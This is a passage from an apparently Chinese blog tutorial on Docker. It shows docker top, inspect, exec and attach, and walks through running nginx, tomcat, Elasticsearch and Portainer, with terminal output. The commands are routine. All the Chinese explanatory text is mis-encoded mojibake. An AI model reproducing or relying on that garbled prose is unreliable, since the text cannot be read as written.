<li><code>/bin/bash -c &quot;while true;do echo zyy hello;sleep 1;done&quot;</code> å‚æ•°è¡¨ç¤ºåœ¨å®¹å™¨å†…éƒ¨æ‰§è¡Œçš„ shell å‘½ä»¤ã€‚å…¶ä¸­ <code>/bin/bash</code> æ˜¯ shell çš„è·¯å¾„ï¼Œ<code>-c</code> å‚æ•°è¡¨ç¤ºåœ¨ shell ä¸­æ‰§è¡ŒæŒ‡å®šçš„å‘½ä»¤ã€‚è¿™é‡Œçš„å‘½ä»¤æ˜¯ä¸€ä¸ªæ— é™å¾ªç¯ï¼Œä¸åœåœ°è¾“å‡ºå­—ç¬¦ä¸² â€œzyy helloâ€ã€‚</li>
</ul>
<blockquote>
<p>æŸ¥çœ‹å®¹å™¨ä¸­çš„è¿›ç¨‹ä¿¡æ¯</p>
</blockquote>
<p>docker top å®¹å™¨id</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker ps</span></span><br><span class="line">CONTAINER ID   IMAGE     COMMAND       CREATED         STATUS         PORTS     NAMES</span><br><span class="line">4ee256515d6e   centos    <span class="string">&quot;/bin/bash&quot;</span>   4 seconds ago   Up 3 seconds             frosty_swartz</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker top 4ee256515d6e</span></span><br><span class="line">UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD</span><br><span class="line">root                2564662             2564639             0                   10:33               pts/0               00:00:00            /bin/bash</span><br></pre></td></tr></table></figure>

<blockquote>
<p>æŸ¥çœ‹é•œåƒçš„å…ƒæ•°æ®</p>
</blockquote>
<p>docker inspect å®¹å™¨id<br>å…ƒæ•°æ® (meta data)â€”â€”â€œdata about dataâ€ æè¿°æ•°æ®çš„æ•°æ®ï¼Œä¸€èˆ¬æ˜¯ç»“æ„åŒ–æ•°æ® </p>
<p>å…ƒæ•°æ®æ˜¯æŒ‡ä»ä¿¡æ¯èµ„æºä¸­æŠ½å–å‡ºæ¥çš„ç”¨äºè¯´æ˜å…¶ç‰¹å¾ã€å†…å®¹çš„ç»“æ„åŒ–çš„æ•°æ®(å¦‚é¢˜å,ç‰ˆæœ¬ã€å‡ºç‰ˆæ•°æ®ã€ç›¸å…³è¯´æ˜,åŒ…æ‹¬æ£€ç´¢ç‚¹ç­‰)ï¼Œç”¨äºç»„ç»‡ã€æè¿°ã€æ£€ç´¢ã€ä¿å­˜ã€ç®¡ç†ä¿¡æ¯å’ŒçŸ¥è¯†èµ„æº</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker inspect 4ee256515d6e</span></span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;Id&quot;</span>: <span class="string">&quot;4ee256515d6e776f4e2b6e8e80d1a65b67635347465ba27a08035cffb3f01983&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Created&quot;</span>: <span class="string">&quot;2024-09-22T02:33:02.5872125Z&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Path&quot;</span>: <span class="string">&quot;/bin/bash&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Args&quot;</span>: [],</span><br><span class="line">        <span class="string">&quot;State&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;Status&quot;</span>: <span class="string">&quot;running&quot;</span>,</span><br><span class="line">........</span><br></pre></td></tr></table></figure>

<blockquote>
<p>è¿›å…¥å½“å‰æ­£åœ¨è¿è¡Œçš„å®¹å™¨</p>
</blockquote>
<p><strong>æ–¹å¼ä¸€ï¼šdocker exec</strong></p>
<p>docker exec -it å®¹å™¨id &#x2F;bin&#x2F;bash</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker exec -it 4ee256515d6e /bin/sh</span></span><br><span class="line">sh-4.4<span class="comment"># ls</span></span><br><span class="line">bin  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br></pre></td></tr></table></figure>

<p><strong>æ–¹å¼äºŒï¼šdocker attach</strong></p>
<p>docker attach å®¹å™¨id</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker attach 4ee256515d6e</span></span><br><span class="line">[root@4ee256515d6e /]<span class="comment"># ls</span></span><br><span class="line">bin  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br></pre></td></tr></table></figure>

<p>åŒºåˆ«</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># docker exec       # è¿›å…¥å®¹å™¨åå¼€å¯ä¸€ä¸ªæ–°çš„ç»ˆç«¯ï¼Œå¯ä»¥åœ¨é‡Œé¢æ“ä½œ</span></span><br><span class="line"><span class="comment"># docker attach     # è¿›å…¥å®¹å™¨æ­£åœ¨æ‰§è¡Œçš„ç»ˆç«¯ï¼Œä¸ä¼šå¯åŠ¨æ–°çš„è¿›ç¨‹</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>ä»å®¹å™¨æ‹·è´åˆ°ä¸»æœºä¸Šã€ä»ä¸»æœºæ‹·è´åˆ°å®¹å™¨ä¸Š</p>
</blockquote>
<p>docker   cp   å®¹å™¨id:å®¹å™¨æ–‡ä»¶   ä¸»æœºè·¯å¾„</p>
<p>docker   cp   ä¸»æœºæ–‡ä»¶   å®¹å™¨id:å®¹å™¨è·¯å¾„</p>
<h2 id="5ã€å‘½ä»¤å¤§å…¨"><a href="#5ã€å‘½ä»¤å¤§å…¨" class="headerlink" title="5ã€å‘½ä»¤å¤§å…¨"></a>5ã€å‘½ä»¤å¤§å…¨</h2><p><a href="https://pythondjango.cn/python/tools/2-docker-dockerfile/">https://pythondjango.cn/python/tools/2-docker-dockerfile/</a></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/a35078a4e14770dc23e9e96e77b8fa78--3ca0--image-20240922104456381.png" alt="image-20240922104456381"></p>
<h1 id="å››ã€Dockerçš„ä½¿ç”¨ç»ƒä¹ "><a href="#å››ã€Dockerçš„ä½¿ç”¨ç»ƒä¹ " class="headerlink" title="å››ã€Dockerçš„ä½¿ç”¨ç»ƒä¹ "></a>å››ã€Dockerçš„ä½¿ç”¨ç»ƒä¹ </h1><h2 id="1ã€Dockerå®‰è£…nginx"><a href="#1ã€Dockerå®‰è£…nginx" class="headerlink" title="1ã€Dockerå®‰è£…nginx"></a>1ã€Dockerå®‰è£…nginx</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker pull nginx 1ã€ æ‹‰å–nginx</span></span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/nginx</span><br><span class="line">a2318d6c47ec: Pull complete </span><br><span class="line">095d327c79ae: Pull complete </span><br><span class="line">bbfaa25db775: Pull complete </span><br><span class="line">7bb6fb0cfb2b: Pull complete </span><br><span class="line">0723edc10c17: Pull complete </span><br><span class="line">24b3fdc4d1e3: Pull complete </span><br><span class="line">3122471704d5: Pull complete </span><br><span class="line">Digest: sha256:04ba374043ccd2fc5c593885c0eacddebabd5ca375f9323666f28dfd5a9710e3</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> nginx:latest</span><br><span class="line">docker.io/library/nginx:latest</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker images</span></span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">nginx         latest    39286ab8a5e1   5 weeks ago     188MB</span><br><span class="line">hello-world   latest    d2c94e258dcb   16 months ago   13.3kB</span><br><span class="line">centos        latest    5d0da3dc9764   3 years ago     231MB</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker run -it -d --name nginx01 -p 3344:80 nginx å¯åŠ¨nginx</span></span><br><span class="line">6c511e58320a06a81eeec1708d7fecd85486d8b879711ab3993e6599849cb5d6</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker ps  æŸ¥çœ‹nginxå®¹å™¨</span></span><br><span class="line">CONTAINER ID   IMAGE     COMMAND                  CREATED          STATUS          PORTS                                   NAMES</span><br><span class="line">6c511e58320a   nginx     <span class="string">&quot;/docker-entrypoint.â€¦&quot;</span>   28 seconds ago   Up 28 seconds   0.0.0.0:3344-&gt;80/tcp, :::3344-&gt;80/tcp   nginx01</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/427e9af89ddfbabc7c02f78814a92408--610e--image-20240922105436716.png" alt="image-20240922105436716"></p>
<p>æˆåŠŸæ­å»ºï¼ˆæ³¨æ„è¿™é‡Œéœ€è¦æœåŠ¡å™¨å¼€å¯å¯¹åº”çš„3344ç«¯å£ï¼Œå¤–ç•Œæ‰èƒ½è®¿é—®åˆ°ï¼‰</p>
<p><strong><code>docker run -it -d --name nginx02 -p 3344:80 nginx</code>è§£é‡Š</strong></p>
<ul>
<li><code>docker run</code>ï¼šå¯åŠ¨ä¸€ä¸ªæ–°çš„å®¹å™¨</li>
<li><code>-it</code>ï¼šè¡¨ç¤ºå¯ç”¨äº¤äº’å¼ç»ˆç«¯å¹¶åˆ†é…ä¸€ä¸ªä¼ªç»ˆç«¯ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥åœ¨å®¹å™¨ä¸­äº¤äº’å¼åœ°æ‰§è¡Œå‘½ä»¤ã€‚</li>
<li><code>-d</code>ï¼šè¡¨ç¤ºå°†å®¹å™¨è¿è¡Œåœ¨åå°ï¼ˆå®ˆæŠ¤è¿›ç¨‹ï¼‰ã€‚</li>
<li><code>--name nginx02</code>ï¼šç»™å®¹å™¨èµ·ä¸€ä¸ªåå­—å«åš <code>nginx02</code>ã€‚</li>
<li><code>-p 3344:80</code>ï¼šå°†ä¸»æœºçš„ 3344 ç«¯å£æ˜ å°„åˆ°å®¹å™¨çš„ 80 ç«¯å£ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¸»æœºçš„ 3344 ç«¯å£æ¥è®¿é—®å®¹å™¨å†…çš„ Nginx æœåŠ¡ã€‚</li>
<li><code>nginx</code>ï¼šè¡¨ç¤ºè¦å¯åŠ¨çš„é•œåƒåç§°ä¸º <code>nginx</code>ã€‚</li>
</ul>
<p>å› æ­¤ï¼Œè¿™ä¸ªå‘½ä»¤çš„ä½œç”¨æ˜¯åœ¨ Docker ä¸­å¯åŠ¨ä¸€ä¸ªåä¸º <code>nginx02</code> çš„å®¹å™¨ï¼Œè¿è¡Œ Nginx æœåŠ¡ï¼Œå¹¶å°†å®¹å™¨çš„ 80 ç«¯å£æ˜ å°„åˆ°ä¸»æœºçš„ 3344 ç«¯å£ï¼Œä»¥ä¾¿æˆ‘ä»¬å¯ä»¥é€šè¿‡è®¿é—®ä¸»æœºçš„ 3344 ç«¯å£æ¥è®¿é—® Nginx æœåŠ¡ã€‚å®¹å™¨ä¼šåœ¨åå°è¿è¡Œï¼Œå¹¶å¯ç”¨äº¤äº’å¼ç»ˆç«¯ã€‚</p>
<h2 id="2ã€å®‰è£…ä¸€ä¸ªtomcat"><a href="#2ã€å®‰è£…ä¸€ä¸ªtomcat" class="headerlink" title="2ã€å®‰è£…ä¸€ä¸ªtomcat"></a>2ã€å®‰è£…ä¸€ä¸ªtomcat</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker pull tomcat  æ‹‰å–é•œåƒ</span></span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/tomcat</span><br><span class="line">32b824d45c61: Pull complete </span><br><span class="line">fe18bb7e114f: Pull complete </span><br><span class="line">581ebfe08d3f: Pull complete </span><br><span class="line">7c7bdd063feb: Pull complete </span><br><span class="line">28f1e2918031: Pull complete </span><br><span class="line">dbce9ebf04f0: Pull complete </span><br><span class="line">4f4fb700ef54: Pull complete </span><br><span class="line">2963b9c3d96f: Pull complete </span><br><span class="line">Digest: sha256:0298f25ea8171042fe610457ff0fd72382d36a144eae4483e2784bbbae31d68b</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> tomcat:latest</span><br><span class="line">docker.io/library/tomcat:latest</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker run -d -p 3355:8080 --name tomcat01 tomcat  å¯åŠ¨å®¹å™¨</span></span><br><span class="line">c0186e2559f5fe67ca6b32f386859ea1a3028572c42c93237ef746581c59361e</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/9711f3688d4cf560af0826f568ab9078--c194--image-20240922110708559.png" alt="image-20240922110708559"></p>
<p>å‘ç°æœåŠ¡å¯ä»¥è®¿é—®ï¼Œä½†æ˜¯æ²¡æœ‰é¡µé¢</p>
<p>è¿›å…¥æœåŠ¡</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker exec -it c0186e2559 /bin/bash è¿›å…¥å®¹å™¨</span></span><br><span class="line">root@c0186e2559f5:/usr/local/tomcat/webapps<span class="comment"># ls</span></span><br></pre></td></tr></table></figure>

<p>å‘ç°webappä¸‹ä¸ºç©º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># åŸå› ï¼šé˜¿é‡Œäº‘é•œåƒçš„åŸå› ï¼Œé˜¿é‡Œäº‘é»˜è®¤æ˜¯æœ€å°çš„é•œåƒï¼Œæ‰€ä»¥ä¸å¿…è¦çš„éƒ½å‰”é™¤æ‰</span><br><span class="line"># ä¿è¯æœ€å°å¯è¿è¡Œçš„ç¯å¢ƒï¼</span><br></pre></td></tr></table></figure>

<p>è§£å†³æ–¹æ¡ˆï¼šå°†webapps.distä¸‹çš„æ–‡ä»¶éƒ½æ‹·è´åˆ°webappsä¸‹å³å¯</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@c0186e2559f5:/usr/local/tomcat<span class="comment"># cp -r webapps.dist/* webapps</span></span><br></pre></td></tr></table></figure>

<p>åˆ·æ–°ä¸€ä¸‹æœåŠ¡ï¼Œå°±æœ‰é¡µé¢äº†</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/8f92f4b563b758a8b61da0eaabd8e257--ae1f--image-20240922111002319.png" alt="image-20240922111002319"></p>
<p>é—®é¢˜:æˆ‘ä»¬ä»¥åè¦éƒ¨ç½²é¡¹ç›®ï¼Œå¦‚æœæ¯æ¬¡éƒ½è¦è¿›å…¥å®¹å™¨æ˜¯ä¸æ˜¯ååˆ†éº»çƒ¦ï¼Ÿè¦æ˜¯å¯ä»¥åœ¨å®¹å™¨å¤–éƒ¨æä¾›ä¸€ä¸ªæ˜ å°„è·¯å¾„ï¼Œæ¯”å¦‚webappsï¼Œæˆ‘ä»¬åœ¨å¤–éƒ¨æ”¾ç½®é¡¹ç›®ï¼Œå°±è‡ªåŠ¨åŒæ­¥å†…éƒ¨å°±å¥½äº†ï¼</p>
<h2 id="3ã€Dockerå®‰è£…Elesticsearch"><a href="#3ã€Dockerå®‰è£…Elesticsearch" class="headerlink" title="3ã€Dockerå®‰è£…Elesticsearch"></a>3ã€Dockerå®‰è£…Elesticsearch</h2><p>elasticsearchæš´éœ²çš„ç«¯å£å¾ˆå¤š</p>
<p>ååˆ†è€—å†…å­˜ï¼ˆæ‰€ä»¥ä½“ç°æµ‹è¯•çš„æ—¶å€™å¯ä»¥æå‰æŠŠå…¶ä»–dockerå®¹å™¨å…ˆåœæ­¢ï¼Œå¯åŠ¨æ—¶å¯ä»¥é™åˆ¶å †å†…å­˜å¤§å°ï¼‰</p>
<p>es çš„æ•°æ®ä¸€èˆ¬éœ€è¦æ”¾ç½®åˆ°å®‰å…¨ç›®å½•ï¼æŒ‚è½½</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker run -d --name es -p 9200:9200 -p 9300:9300 -e &quot;discovery.type=single-node&quot; -e ES_JAVA_OPTS=&quot;-Xms64m -Xmx512m&quot; elasticsearch:7.6.2</span></span><br><span class="line">Unable to find image <span class="string">&#x27;elasticsearch:7.6.2&#x27;</span> locally</span><br><span class="line">7.6.2: Pulling from library/elasticsearch</span><br><span class="line">ab5ef0e58194: Pull complete </span><br><span class="line">c4d1ca5c8a25: Pull complete </span><br><span class="line">941a3cc8e7b8: Pull complete </span><br><span class="line">43ec483d9618: Pull complete </span><br><span class="line">c486fd200684: Pull complete </span><br><span class="line">1b960df074b2: Pull complete </span><br><span class="line">1719d48d6823: Pull complete </span><br><span class="line">Digest: sha256:1b09dbd93085a1e7bca34830e77d2981521a7210e11f11eda997add1c12711fa</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> elasticsearch:7.6.2</span><br><span class="line">6861a387a1cac6856d948d54b5ec3db63b04f762d0deb2a7f7ba4e77af3d7a62</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># curl localhost:9200</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;name&quot;</span> : <span class="string">&quot;6861a387a1ca&quot;</span>,</span><br><span class="line">  <span class="string">&quot;cluster_name&quot;</span> : <span class="string">&quot;docker-cluster&quot;</span>,</span><br><span class="line">  <span class="string">&quot;cluster_uuid&quot;</span> : <span class="string">&quot;b2Wz4EljT7qCteo0VMyFMQ&quot;</span>,</span><br><span class="line">  <span class="string">&quot;version&quot;</span> : &#123;</span><br><span class="line">    <span class="string">&quot;number&quot;</span> : <span class="string">&quot;7.6.2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;build_flavor&quot;</span> : <span class="string">&quot;default&quot;</span>,</span><br><span class="line">    <span class="string">&quot;build_type&quot;</span> : <span class="string">&quot;docker&quot;</span>,</span><br><span class="line">    <span class="string">&quot;build_hash&quot;</span> : <span class="string">&quot;ef48eb35cf30adf4db14086e8aabd07ef6fb113f&quot;</span>,</span><br><span class="line">    <span class="string">&quot;build_date&quot;</span> : <span class="string">&quot;2020-03-26T06:34:37.794943Z&quot;</span>,</span><br><span class="line">    <span class="string">&quot;build_snapshot&quot;</span> : <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&quot;lucene_version&quot;</span> : <span class="string">&quot;8.4.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;minimum_wire_compatibility_version&quot;</span> : <span class="string">&quot;6.8.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;minimum_index_compatibility_version&quot;</span> : <span class="string">&quot;6.0.0-beta1&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;tagline&quot;</span> : <span class="string">&quot;You Know, for Search&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker stats   #æŸ¥çœ‹cpuçŠ¶æ€</span></span><br><span class="line">CONTAINER ID   NAME      CPU %     MEM USAGE / LIMIT     MEM %     NET I/O           BLOCK I/O         PIDS</span><br><span class="line">6861a387a1ca   es        3.26%     368.8MiB / 1.918GiB   18.78%    4.11kB / 3.75kB   6.16MB / 2.03MB   45</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/b2631e9ff0347714db21901b08846644--be00--image-20240922112744309.png" alt="image-20240922112744309"></p>
<p><strong><code>docker run -d --name es -p 9200:9200 -p 9300:9300 -e &quot;discovery.type=single-node&quot; -e ES_JAVA_OPTS=&quot;-Xms64m -Xmx512m&quot; elasticsearch:7.6.2</code>å‘½ä»¤è§£é‡Š</strong></p>
<p>è¿™æ˜¯ä¸€ä¸ªä½¿ç”¨ Docker å‘½ä»¤è¡Œå·¥å…·æ¥å¯åŠ¨ä¸€ä¸ª Elasticsearch ç‰ˆæœ¬ä¸º 7.6.2 çš„å®¹å™¨ï¼Œå¹¶è®¾ç½®äº†ä¸€äº›é€‰é¡¹å’Œå‚æ•°ã€‚</p>
<p>å…·ä½“æ¥è¯´ï¼Œè¿™äº›é€‰é¡¹å’Œå‚æ•°çš„å«ä¹‰å¦‚ä¸‹ï¼š</p>
<ul>
<li><code>-d</code> è¡¨ç¤ºåœ¨åå°è¿è¡Œå®¹å™¨ï¼Œå³ä»¥â€œå®ˆæŠ¤è¿›ç¨‹â€æ¨¡å¼è¿è¡Œï¼Œä¸ä¼šå ç”¨å½“å‰ç»ˆç«¯çš„æ§åˆ¶å°ï¼›</li>
<li><code>--name es</code> è¡¨ç¤ºç»™å®¹å™¨èµ·ä¸€ä¸ªåç§°ä¸º â€œesâ€ï¼›</li>
<li><code>-p 9200:9200 -p 9300:9300</code> è¡¨ç¤ºå°†å®¹å™¨å†…éƒ¨çš„ 9200 ç«¯å£å’Œ 9300 ç«¯å£æ˜ å°„åˆ°ä¸»æœºçš„ 9200 å’Œ 9300 ç«¯å£ä¸Šï¼Œä»¥ä¾¿åœ¨ä¸»æœºä¸Šé€šè¿‡æµè§ˆå™¨æˆ–å®¢æˆ·ç«¯è¿æ¥ Elasticsearchï¼›</li>
<li><code>-e &quot;discovery.type=single-node&quot;</code> è¡¨ç¤ºè®¾ç½® Elasticsearch çš„èŠ‚ç‚¹ç±»å‹ä¸º â€œsingle-nodeâ€ï¼Œå³å•èŠ‚ç‚¹æ¨¡å¼ï¼Œè¿™æ˜¯ä¸€ä¸ªç®€å•çš„è¿è¡Œ Elasticsearch çš„æ–¹å¼ï¼Œé€‚ç”¨äºæµ‹è¯•æˆ–å¼€å‘ç¯å¢ƒï¼›</li>
<li><code>-e ES_JAVA_OPTS=&quot;-Xms64m -Xmx512m&quot;</code> è¡¨ç¤ºè®¾ç½® Elasticsearch çš„ Java è™šæ‹Ÿæœºå‚æ•°ï¼Œå…¶ä¸­ â€œ-Xms64mâ€ è¡¨ç¤ºè®¾ç½®åˆå§‹å †å¤§å°ä¸º 64MBï¼Œâ€-Xmx512mâ€ è¡¨ç¤ºè®¾ç½®æœ€å¤§å †å¤§å°ä¸º 512MBï¼›</li>
<li><code>elasticsearch:7.6.2</code> è¡¨ç¤ºè¦è¿è¡Œçš„å®¹å™¨é•œåƒåç§°å’Œç‰ˆæœ¬å·ï¼Œè¿™é‡Œæ˜¯ Elasticsearch å®˜æ–¹æä¾›çš„ 7.6.2 ç‰ˆæœ¬ã€‚</li>
</ul>
<p>æ€»ä½“æ¥è¯´ï¼Œè¿™ä¸ªå‘½ä»¤çš„ä½œç”¨æ˜¯åœ¨ Docker ä¸­å¯åŠ¨ä¸€ä¸ª Elasticsearch 7.6.2 çš„å®¹å™¨ï¼Œå¹¶å°†å®¹å™¨å†…éƒ¨çš„ç«¯å£æ˜ å°„åˆ°ä¸»æœºä¸Šï¼Œä»¥ä¾¿åœ¨ä¸»æœºä¸Šè®¿é—® Elasticsearchã€‚å…¶ä¸­çš„é€‰é¡¹å’Œå‚æ•°å¯ä»¥æ ¹æ®éœ€è¦è¿›è¡Œä¿®æ”¹æˆ–è°ƒæ•´ã€‚</p>
<h1 id="äº”ã€portainerå¯è§†åŒ–é¢æ¿å®‰è£…"><a href="#äº”ã€portainerå¯è§†åŒ–é¢æ¿å®‰è£…" class="headerlink" title="äº”ã€portainerå¯è§†åŒ–é¢æ¿å®‰è£…"></a>äº”ã€portainerå¯è§†åŒ–é¢æ¿å®‰è£…</h1><ul>
<li>portainer(å…ˆç”¨è¿™ä¸ª)</li>
<li>rancher(CI&#x2F;DIå†ç”¨)</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker run -d -p 8088:9000 --restart=always -v /var/run/docker.sock:/var/run/docker.sock --privileged=true portainer/portainer</span></span><br><span class="line">Unable to find image <span class="string">&#x27;portainer/portainer:latest&#x27;</span> locally</span><br><span class="line">latest: Pulling from portainer/portainer</span><br><span class="line">772227786281: Pull complete </span><br><span class="line">96fd13befc87: Pull complete </span><br><span class="line">0bad1d247b5b: Pull complete </span><br><span class="line">b5d1b01b1d39: Pull complete </span><br><span class="line">Digest: sha256:47b064434edf437badf7337e516e07f64477485c8ecc663ddabbe824b20c672d</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> portainer/portainer:latest</span><br><span class="line">8de613bef9cc0af508c8db2433789ee570f1a7737260130c36ab03d7fcfd54a9</span><br></pre></td></tr></table></figure>

<p><strong><code>docker run -d -p 8088:9000 --restart=always -v /var/run/docker.sock:/var/run/docker.sock --privileged=true portainer/portainer</code>è§£é‡Š</strong></p>
<p>è¿™æ˜¯ä¸€ä¸ªç”¨äºè¿è¡Œ Docker å®¹å™¨çš„ Docker å‘½ä»¤ã€‚å…·ä½“æ¥è¯´ï¼Œè¯¥å‘½ä»¤å¯åŠ¨äº†ä¸€ä¸ªåä¸º Portainer çš„ Docker å®¹å™¨ï¼Œå¹¶å°†å®¹å™¨çš„ 9000 ç«¯å£æ˜ å°„åˆ°ä¸»æœºçš„ 8088 ç«¯å£ï¼Œä»¥ä¾¿åœ¨ä¸»æœºä¸Šé€šè¿‡æµè§ˆå™¨è®¿é—® Portainerã€‚</p>
<p>ä»¥ä¸‹æ˜¯å„ä¸ªå‚æ•°çš„å«ä¹‰ï¼š</p>
<ul>
<li><code>-d</code>ï¼šè¡¨ç¤ºä»¥åå°æ¨¡å¼è¿è¡Œå®¹å™¨ã€‚</li>
<li><code>-p 8088:9000</code>ï¼šè¡¨ç¤ºå°†å®¹å™¨çš„ 9000 ç«¯å£æ˜ å°„åˆ°ä¸»æœºçš„ 8088 ç«¯å£ã€‚</li>
<li><code>--restart=always</code>ï¼šè¡¨ç¤ºå®¹å™¨åœ¨åœæ­¢åæ€»æ˜¯ä¼šè‡ªåŠ¨é‡å¯ã€‚</li>
<li><code>-v /var/run/docker.sock:/var/run/docker.sock</code>ï¼šè¡¨ç¤ºå°†ä¸»æœºçš„ Docker å®ˆæŠ¤è¿›ç¨‹çš„ Unix å¥—æ¥å­—æ–‡ä»¶ï¼ˆ&#x2F;var&#x2F;run&#x2F;docker.sockï¼‰æŒ‚è½½åˆ°å®¹å™¨çš„åŒä¸€ä½ç½®ï¼Œä»è€Œè®© Portainer å¯ä»¥ç®¡ç†ä¸»æœºä¸Šçš„å…¶ä»– Docker å®¹å™¨ã€‚</li>
<li><code>--privileged=true</code>ï¼šè¡¨ç¤ºåœ¨å®¹å™¨ä¸­å¼€å¯ç‰¹æƒæ¨¡å¼ï¼Œä»¥ä¾¿ Portainer èƒ½å¤Ÿè®¿é—®ä¸»æœºä¸Šçš„ Docker å®ˆæŠ¤è¿›ç¨‹ã€‚</li>
</ul>
<p>æ€»ä¹‹ï¼Œè¿™ä¸ªå‘½ä»¤çš„ä½œç”¨æ˜¯åœ¨ä¸»æœºä¸Šå¯åŠ¨ä¸€ä¸ª Portainer å®¹å™¨ï¼Œä»¥ä¾¿é€šè¿‡ web ç•Œé¢æ¥ç®¡ç†å’Œç›‘æ§å…¶ä»– Docker å®¹å™¨ã€‚</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/5ed9c8b958e7da80cce2ec4be260697e--a128--image-20240922151045620.png" alt="image-20240922151045620"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/1723b6decc7608a24c3ab59cf2dadd75--6e31--image-20240922151150791.png" alt="image-20240922151150791"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/3af376d05b8b74bd529ba6cee95b464d--6a23--image-20240922151227485.png" alt="image-20240922151227485"></p>
<ul>
<li>ä½¿ç”¨å›¾å½¢åŒ–ç•Œé¢å¯¹dockerå®¹å™¨é•œåƒè¿›è¡Œå¯¹åº”çš„ç®¡ç†</li>
</ul>
<h1 id="å…­ã€Dockeré•œåƒ"><a href="#å…­ã€Dockeré•œåƒ" class="headerlink" title="å…­ã€Dockeré•œåƒ"></a>å…­ã€Dockeré•œåƒ</h1><h2 id="1ã€é•œåƒæ˜¯ä»€ä¹ˆ"><a href="#1ã€é•œåƒæ˜¯ä»€ä¹ˆ" class="headerlink" title="1ã€é•œåƒæ˜¯ä»€ä¹ˆ"></a>1ã€é•œåƒæ˜¯ä»€ä¹ˆ</h2><p>é•œåƒæ˜¯ä¸€ç§è½»é‡çº§ã€å¯æ‰§è¡Œçš„ç‹¬ç«‹è½¯ä»¶åŒ…ï¼Œç”¨æ¥æ‰“åŒ…è½¯ä»¶è¿è¡Œç¯å¢ƒå’ŒåŸºäºè¿è¡Œç¯å¢ƒå¼€å‘çš„è½¯ä»¶ï¼Œå®ƒåŒ…å«</p>
<p>è¿è¡ŒæŸä¸ªè½¯ä»¶æ‰€éœ€çš„æ‰€æœ‰å†…å®¹ï¼ŒåŒ…æ‹¬ä»£ç ã€è¿è¡Œæ—¶ã€åº“ã€ç¯å¢ƒå˜é‡å’Œé…ç½®æ–‡ä»¶ã€‚</p>
<h2 id="2ã€Dockeré•œåƒåŠ è½½åŸç†"><a href="#2ã€Dockeré•œåƒåŠ è½½åŸç†" class="headerlink" title="2ã€Dockeré•œåƒåŠ è½½åŸç†"></a>2ã€Dockeré•œåƒåŠ è½½åŸç†</h2><blockquote>
<p>UnionFS(è”åˆæ–‡ä»¶ç³»ç»Ÿ)</p>
</blockquote>
